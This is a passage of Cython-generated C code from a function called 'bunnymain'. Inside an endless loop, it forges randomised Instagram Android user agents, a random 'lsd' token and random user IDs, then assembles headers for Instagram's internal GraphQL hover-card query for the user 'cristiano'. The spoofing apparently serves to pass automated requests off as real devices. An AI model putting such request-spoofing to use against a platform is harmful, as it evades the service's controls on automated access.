  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  PyObject *__pyx_t_12 = NULL;
  int __pyx_t_13;
  int __pyx_t_14;
  int __pyx_t_15;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("bunnymain", 0);

  
  while (1) {

    
    {
      __Pyx_PyThreadState_declare
      __Pyx_PyThreadState_assign
      __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
      __Pyx_XGOTREF(__pyx_t_1);
      __Pyx_XGOTREF(__pyx_t_2);
      __Pyx_XGOTREF(__pyx_t_3);
      /*try:*/ {

        
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 579, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 579, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__53, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 579, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 579, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_user_id, __pyx_t_5);
        __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 580, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 580, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__54, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 580, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyUnicode_Type)), __pyx_t_5); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 580, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_rnd, __pyx_t_4);
        __pyx_t_4 = 0;

        
        __pyx_t_4 = PyTuple_New(17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_6 = 0;
        __pyx_t_7 = 127;
        __Pyx_INCREF(__pyx_kp_u_Instagram_311_0_0_32_118_Android);
        __pyx_t_6 += 34;
        __Pyx_GIVEREF(__pyx_kp_u_Instagram_311_0_0_32_118_Android);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_kp_u_Instagram_311_0_0_32_118_Android);
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_choice); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = PyList_New(6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_INCREF(__pyx_kp_u_23_6_0);
        __Pyx_GIVEREF(__pyx_kp_u_23_6_0);
        PyList_SET_ITEM(__pyx_t_8, 0, __pyx_kp_u_23_6_0);
        __Pyx_INCREF(__pyx_kp_u_24_7_0);
        __Pyx_GIVEREF(__pyx_kp_u_24_7_0);
        PyList_SET_ITEM(__pyx_t_8, 1, __pyx_kp_u_24_7_0);
        __Pyx_INCREF(__pyx_kp_u_25_7_1_1);
        __Pyx_GIVEREF(__pyx_kp_u_25_7_1_1);
        PyList_SET_ITEM(__pyx_t_8, 2, __pyx_kp_u_25_7_1_1);
        __Pyx_INCREF(__pyx_kp_u_26_8_0);
        __Pyx_GIVEREF(__pyx_kp_u_26_8_0);
        PyList_SET_ITEM(__pyx_t_8, 3, __pyx_kp_u_26_8_0);
        __Pyx_INCREF(__pyx_kp_u_27_8_1);
        __Pyx_GIVEREF(__pyx_kp_u_27_8_1);
        PyList_SET_ITEM(__pyx_t_8, 4, __pyx_kp_u_27_8_1);
        __Pyx_INCREF(__pyx_kp_u_28_9_0);
        __Pyx_GIVEREF(__pyx_kp_u_28_9_0);
        PyList_SET_ITEM(__pyx_t_8, 5, __pyx_kp_u_28_9_0);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_5 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_9, __pyx_t_10, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_8);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_9);
        __pyx_t_9 = 0;
        __Pyx_INCREF(__pyx_kp_u__36);
        __pyx_t_6 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__36);
        PyTuple_SET_ITEM(__pyx_t_4, 2, __pyx_kp_u__36);

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_random); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__55, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 3, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u_dpi);
        __pyx_t_6 += 5;
        __Pyx_GIVEREF(__pyx_kp_u_dpi);
        PyTuple_SET_ITEM(__pyx_t_4, 4, __pyx_kp_u_dpi);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_9) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_9);
        __Pyx_GIVEREF(__pyx_t_9);
        PyTuple_SET_ITEM(__pyx_t_4, 5, __pyx_t_9);
        __pyx_t_9 = 0;
        __Pyx_INCREF(__pyx_n_u_x);
        __pyx_t_6 += 1;
        __Pyx_GIVEREF(__pyx_n_u_x);
        PyTuple_SET_ITEM(__pyx_t_4, 6, __pyx_n_u_x);
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_random); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__56, NULL); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_9, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 583, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 7, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u__36);
        __pyx_t_6 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__36);
        PyTuple_SET_ITEM(__pyx_t_4, 8, __pyx_kp_u__36);

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_random); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 584, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_choice); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 584, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = PyList_New(12); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 584, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_INCREF(__pyx_n_u_SAMSUNG);
        __Pyx_GIVEREF(__pyx_n_u_SAMSUNG);
        PyList_SET_ITEM(__pyx_t_9, 0, __pyx_n_u_SAMSUNG);
        __Pyx_INCREF(__pyx_n_u_HUAWEI);
        __Pyx_GIVEREF(__pyx_n_u_HUAWEI);
        PyList_SET_ITEM(__pyx_t_9, 1, __pyx_n_u_HUAWEI);
        __Pyx_INCREF(__pyx_kp_u_LGE_lge);
        __Pyx_GIVEREF(__pyx_kp_u_LGE_lge);
        PyList_SET_ITEM(__pyx_t_9, 2, __pyx_kp_u_LGE_lge);
        __Pyx_INCREF(__pyx_n_u_HTC);
        __Pyx_GIVEREF(__pyx_n_u_HTC);
        PyList_SET_ITEM(__pyx_t_9, 3, __pyx_n_u_HTC);
        __Pyx_INCREF(__pyx_n_u_ASUS);
        __Pyx_GIVEREF(__pyx_n_u_ASUS);
        PyList_SET_ITEM(__pyx_t_9, 4, __pyx_n_u_ASUS);
        __Pyx_INCREF(__pyx_n_u_ZTE);
        __Pyx_GIVEREF(__pyx_n_u_ZTE);
        PyList_SET_ITEM(__pyx_t_9, 5, __pyx_n_u_ZTE);
        __Pyx_INCREF(__pyx_n_u_ONEPLUS);
        __Pyx_GIVEREF(__pyx_n_u_ONEPLUS);
        PyList_SET_ITEM(__pyx_t_9, 6, __pyx_n_u_ONEPLUS);
        __Pyx_INCREF(__pyx_n_u_XIAOMI);
        __Pyx_GIVEREF(__pyx_n_u_XIAOMI);
        PyList_SET_ITEM(__pyx_t_9, 7, __pyx_n_u_XIAOMI);
        __Pyx_INCREF(__pyx_n_u_OPPO);
        __Pyx_GIVEREF(__pyx_n_u_OPPO);
        PyList_SET_ITEM(__pyx_t_9, 8, __pyx_n_u_OPPO);
        __Pyx_INCREF(__pyx_n_u_VIVO);
        __Pyx_GIVEREF(__pyx_n_u_VIVO);
        PyList_SET_ITEM(__pyx_t_9, 9, __pyx_n_u_VIVO);
        __Pyx_INCREF(__pyx_n_u_SONY);
        __Pyx_GIVEREF(__pyx_n_u_SONY);
        PyList_SET_ITEM(__pyx_t_9, 10, __pyx_n_u_SONY);
        __Pyx_INCREF(__pyx_n_u_REALME);
        __Pyx_GIVEREF(__pyx_n_u_REALME);
        PyList_SET_ITEM(__pyx_t_9, 11, __pyx_n_u_REALME);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_8);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_8, function);
          }
        }
        __pyx_t_5 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 584, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_t_5, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 584, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
        __Pyx_GIVEREF(__pyx_t_8);
        PyTuple_SET_ITEM(__pyx_t_4, 9, __pyx_t_8);
        __pyx_t_8 = 0;
        __Pyx_INCREF(__pyx_kp_u_SM_T);
        __pyx_t_6 += 6;
        __Pyx_GIVEREF(__pyx_kp_u_SM_T);
        PyTuple_SET_ITEM(__pyx_t_4, 10, __pyx_kp_u_SM_T);

        
        __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_rnd, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 585, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
        __Pyx_GIVEREF(__pyx_t_8);
        PyTuple_SET_ITEM(__pyx_t_4, 11, __pyx_t_8);
        __pyx_t_8 = 0;
        __Pyx_INCREF(__pyx_kp_u_SM_T);
        __pyx_t_6 += 6;
        __Pyx_GIVEREF(__pyx_kp_u_SM_T);
        PyTuple_SET_ITEM(__pyx_t_4, 12, __pyx_kp_u_SM_T);
        __pyx_t_8 = __Pyx_PyObject_FormatSimple(__pyx_v_rnd, __pyx_empty_unicode); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 585, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_8) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_8);
        __Pyx_GIVEREF(__pyx_t_8);
        PyTuple_SET_ITEM(__pyx_t_4, 13, __pyx_t_8);
        __pyx_t_8 = 0;
        __Pyx_INCREF(__pyx_kp_u_qcom_en_US_545986);
        __pyx_t_6 += 21;
        __Pyx_GIVEREF(__pyx_kp_u_qcom_en_US_545986);
        PyTuple_SET_ITEM(__pyx_t_4, 14, __pyx_kp_u_qcom_en_US_545986);
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 585, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 585, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__57, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 585, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_FormatSimple(__pyx_t_8, __pyx_empty_unicode); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 585, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_7 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) > __pyx_t_7) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_5) : __pyx_t_7;
        __pyx_t_6 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 15, __pyx_t_5);
        __pyx_t_5 = 0;
        __Pyx_INCREF(__pyx_kp_u__37);
        __pyx_t_6 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__37);
        PyTuple_SET_ITEM(__pyx_t_4, 16, __pyx_kp_u__37);

        
        __pyx_t_5 = __Pyx_PyUnicode_Join(__pyx_t_4, 17, __pyx_t_6, __pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 582, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_user_agent, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 587, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_choices); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 587, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_string); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 588, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_ascii_letters); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 588, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_string); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 589, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_digits); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 589, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_5 = PyNumber_Add(__pyx_t_8, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 588, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;

        
        __pyx_t_9 = PyTuple_New(1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 587, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_9, 0, __pyx_t_5);
        __pyx_t_5 = 0;

        
        __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 590, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_k, __pyx_int_32) < 0) __PYX_ERR(0, 590, __pyx_L5_error)

        
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_t_9, __pyx_t_5); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 587, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

        
        __pyx_t_5 = PyUnicode_Join(__pyx_kp_u__4, __pyx_t_8); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 586, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF_SET(__pyx_v_lsd, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        
        __pyx_t_5 = __Pyx_PyDict_NewPresized(10); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 592, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_accept, __pyx_kp_u__5) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_accept_language, __pyx_kp_u_en_en_US_q_0_9) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_content_type, __pyx_kp_u_application_x_www_form_urlencode_2) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_dnt, __pyx_kp_u_1) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_origin, __pyx_kp_u_https_www_instagram_com_2) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_priority, __pyx_kp_u_u_1_i) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_referer, __pyx_kp_u_https_www_instagram_com_instagra) < 0) __PYX_ERR(0, 592, __pyx_L5_error)

        
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_user_agent, __pyx_v_user_agent) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_x_fb_friendly_name, __pyx_n_u_PolarisUserHoverCardContentV2Que) < 0) __PYX_ERR(0, 592, __pyx_L5_error)

        
        if (PyDict_SetItem(__pyx_t_5, __pyx_kp_u_x_fb_lsd, __pyx_v_lsd) < 0) __PYX_ERR(0, 592, __pyx_L5_error)
        __Pyx_XDECREF_SET(__pyx_v_headers, ((PyObject*)__pyx_t_5));
        __pyx_t_5 = 0;

        
        __pyx_t_5 = __Pyx_PyDict_NewPresized(6); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 604, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_lsd, __pyx_v_lsd) < 0) __PYX_ERR(0, 604, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_fb_api_caller_class, __pyx_n_u_RelayModern) < 0) __PYX_ERR(0, 604, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_u_fb_api_req_friendly_name, __pyx_n_u_PolarisUserHoverCardContentV2Que) < 0) __PYX_ERR(0, 604, __pyx_L5_error)

        
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_json); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 607, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_dumps); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 607, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyDict_NewPresized(2); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 607, __pyx_L5_error)
        __Pyx_GOTREF(__pyx_t_9);
        if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_userID, __pyx_v_user_id) < 0) __PYX_ERR(0, 607, __pyx_L5_error)
        if (PyDict_SetItem(__pyx_t_9, __pyx_n_u_username, __pyx_n_u_cristiano) < 0) __PYX_ERR(0, 607, __pyx_L5_error)
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
          }
        }
        __pyx_t_8 = (__pyx_t_10) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_10, __pyx_t_9) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
